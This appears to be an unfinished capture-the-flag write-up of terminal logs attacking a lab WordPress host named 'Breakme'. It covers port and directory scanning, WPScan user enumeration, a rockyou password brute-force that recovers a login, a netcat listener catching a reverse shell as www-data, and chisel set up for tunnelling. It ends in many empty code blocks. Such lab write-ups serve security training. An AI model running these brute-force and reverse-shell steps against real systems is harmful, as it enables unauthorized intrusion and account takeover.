
<pre><code>> sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.143.40 | tee nmap1.txt
[sudo] contraseña para maxi: 
Lo siento, pruebe otra vez.
[sudo] contraseña para maxi: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-05 20:19 -03
Initiating SYN Stealth Scan at 20:19
Scanning 10.10.143.40 [65535 ports]
Discovered open port 80/tcp on 10.10.143.40
Discovered open port 22/tcp on 10.10.143.40
Completed SYN Stealth Scan at 20:20, 31.81s elapsed (65535 total ports)
Nmap scan report for 10.10.143.40
Host is up, received user-set (0.69s latency).
Scanned at 2024-10-05 20:19:59 -03 for 32s
Not shown: 56260 filtered tcp ports (no-response), 9273 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 31.95 seconds
           Raw packets sent: 129142 (5.682MB) | Rcvd: 9346 (373.860KB)</code></pre>

<pre><code>> sudo nmap -p22,80 -sCV -Pn 10.10.143.40 | tee nmap2.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-05 20:20 -03
Nmap scan report for 10.10.143.40
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 8e:4f:77:7f:f6:aa:6a:dc:17:c9:bf:5a:2b:eb:8c:41 (RSA)
|   256 a3:9c:66:73:fc:b9:23:c0:0f:da:1d:c9:84:d6:b1:4a (ECDSA)
|_  256 6d:c2:0e:89:25:55:10:a9:9e:41:6e:0d:81:9a:17:cb (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.98 seconds</code></pre>

![2024-10-05_20-22](https://github.com/user-attachments/assets/94f59b64-a417-4abe-86b1-8d921741d49e)

<pre><code>gobuster dir -u http://10.10.143.40/ -w /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 | tee gobuster.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.143.40/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.143.40/wordpress/]
/manual               (Status: 301) [Size: 313] [--> http://10.10.143.40/manual/]</code></pre>

![2024-10-05_20-27](https://github.com/user-attachments/assets/760eb7ba-1dde-4adf-a683-80c89772b5ba)

<pre><code>~> searchsploit wordpress 6.4.3
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
NEX-Forms WordPress plugin < 7.9.7 - Authenticated SQLi                            | php/webapps/51042.txt
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                          | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                        | php/webapps/48918.sh
----------------------------------------------------------------------------------- ---------------------------------</code></pre>

<pre><code>> gobuster dir -u http://10.10.143.40/wordpress/ -w /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 150 | tee gobuster-wordpress.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.143.40/wordpress/
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 327] [--> http://10.10.143.40/wordpress/wp-content/]
/wp-includes          (Status: 301) [Size: 328] [--> http://10.10.143.40/wordpress/wp-includes/]
/wp-admin             (Status: 301) [Size: 325] [--> http://10.10.143.40/wordpress/wp-admin/]</code></pre>

wp-login
![2024-10-05_20-46](https://github.com/user-attachments/assets/8cdd36ad-eb68-478f-a463-80d34d43444a)

wp-includes
![2024-10-05_20-47](https://github.com/user-attachments/assets/3b40836a-4847-4346-8e0a-19d28fb231e3)

wp-content no tenia nada

<pre><code>> sudo docker pull wpscanteam/wpscan</code></pre>

<pre><code>> sudo docker run -it --rm wpscanteam/wpscan --url http://10.10.168.66/wordpress
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.168.66/wordpress/ [10.10.168.66]
[+] Started: Sun Oct  6 01:44:05 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.56 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.168.66/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.168.66/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.168.66/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.168.66/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>
 |  - http://10.10.168.66/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://10.10.168.66/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://10.10.168.66/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.2
 | Style URL: http://10.10.168.66/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.168.66/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-data-access
 | Location: http://10.10.168.66/wordpress/wp-content/plugins/wp-data-access/
 | Last Updated: 2024-09-18T00:01:00.000Z
 | [!] The version is out of date, the latest version is 5.5.14
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.3.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.168.66/wordpress/wp-content/plugins/wp-data-access/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:14 <======================================> (137 / 137) 100.00% Time: 00:00:14

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Oct  6 01:44:44 2024
[+] Requests Done: 171
[+] Cached Requests: 5
[+] Data Sent: 46.062 KB
[+] Data Received: 303.196 KB
[+] Memory used: 360.441 MB
[+] Elapsed time: 00:00:39</code></pre>

<pre><code>> sudo docker run -it --rm wpscanteam/wpscan --url http://10.10.168.66/wordpress/ -e u,p,t
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.168.66/wordpress/ [10.10.168.66]
[+] Started: Sun Oct  6 01:48:25 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.56 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.168.66/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.168.66/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.168.66/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.168.66/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>
 |  - http://10.10.168.66/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.4.3</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://10.10.168.66/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://10.10.168.66/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.2
 | Style URL: http://10.10.168.66/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.168.66/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-data-access
 | Location: http://10.10.168.66/wordpress/wp-content/plugins/wp-data-access/
 | Last Updated: 2024-09-18T00:01:00.000Z
 | [!] The version is out of date, the latest version is 5.5.14
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.3.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.168.66/wordpress/wp-content/plugins/wp-data-access/readme.txt

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:30 <=====================================> (400 / 400) 100.00% Time: 00:00:30
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentytwentyfour
 | Location: http://10.10.168.66/wordpress/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://10.10.168.66/wordpress/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.2
 | Style URL: http://10.10.168.66/wordpress/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://10.10.168.66/wordpress/wp-content/themes/twentytwentyfour/, status: 403
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.168.66/wordpress/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'

[+] twentytwentyone
 | Location: http://10.10.168.66/wordpress/wp-content/themes/twentytwentyone/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://10.10.168.66/wordpress/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.3
 | Style URL: http://10.10.168.66/wordpress/wp-content/themes/twentytwentyone/style.css
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.168.66/wordpress/wp-content/themes/twentytwentyone/, status: 500
 |
 | Version: 2.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.168.66/wordpress/wp-content/themes/twentytwentyone/style.css, Match: 'Version: 2.1'

[+] twentytwentythree
 | Location: http://10.10.168.66/wordpress/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://10.10.168.66/wordpress/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | Style URL: http://10.10.168.66/wordpress/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.168.66/wordpress/wp-content/themes/twentytwentythree/, status: 403
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.168.66/wordpress/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.3'

[+] twentytwentytwo
 | Location: http://10.10.168.66/wordpress/wp-content/themes/twentytwentytwo/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://10.10.168.66/wordpress/wp-content/themes/twentytwentytwo/readme.txt
 | [!] The version is out of date, the latest version is 1.8
 | Style URL: http://10.10.168.66/wordpress/wp-content/themes/twentytwentytwo/style.css
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.168.66/wordpress/wp-content/themes/twentytwentytwo/, status: 200
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.168.66/wordpress/wp-content/themes/twentytwentytwo/style.css, Match: 'Version: 1.6'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:03 <=======================================> (10 / 10) 100.00% Time: 00:00:03

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.168.66/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bob
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Oct  6 01:49:29 2024
[+] Requests Done: 468
[+] Cached Requests: 19
[+] Data Sent: 133.995 KB
[+] Data Received: 646.7 KB
[+] Memory used: 398.488 MB
[+] Elapsed time: 00:01:04</code></pre>

<pre><code>[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.168.66/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bob
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)</code></pre>

<pre><code>
~>sudo docker run -it --rm -v /home/maxi/Escritorio/SecLists/Passwords/Leaked-Databases:/seclists wpscanteam/wpscan --url http://10.10.168.66/wordpress/ -U admin,bob --passwords /seclists/rockyou-75.txt  
[+] Performing password attack on Wp Login against 2 user/s
[SUCCESS] - bob / soccer                                                                                             
^Cying admin / doritos Time: 00:16:21 <==                                     > (8149 / 118402)  6.88%  ETA: 03:41:25
[!] Valid Combinations Found:
 | Username: bob, Password: soccer
</code></pre>

![2024-10-05_23-34](https://github.com/user-attachments/assets/a1f0077c-1a43-4794-bfdc-adb66e4f8748)

![2024-10-05_23-39](https://github.com/user-attachments/assets/4ed2fdda-1009-4e42-9610-85aa94f5b35f)

<pre><code>~> nc -nlvp 1234
Connection from 10.10.168.66:54220
Linux Breakme 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64 GNU/Linux
 22:39:33 up  1:27,  0 users,  load average: 0.02, 0.01, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data</code></pre>

<pre><code>$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@Breakme:/home/john$ </code></pre>

<pre><code>www-data@Breakme:/home/john$ ss -tlnp
ss -tlnp
State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*          
LISTEN 0      4096       127.0.0.1:9999      0.0.0.0:*          
LISTEN 0      128          0.0.0.0:22        0.0.0.0:*          
LISTEN 0      511                *:80              *:*          
LISTEN 0      128             [::]:22           [::]:*          </code></pre>

<pre><code>> go install github.com/jpillora/chisel@latest</code></pre>

<pre><code>> ls ~/go/bin/
chisel*</code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>

<pre><code></code></pre>
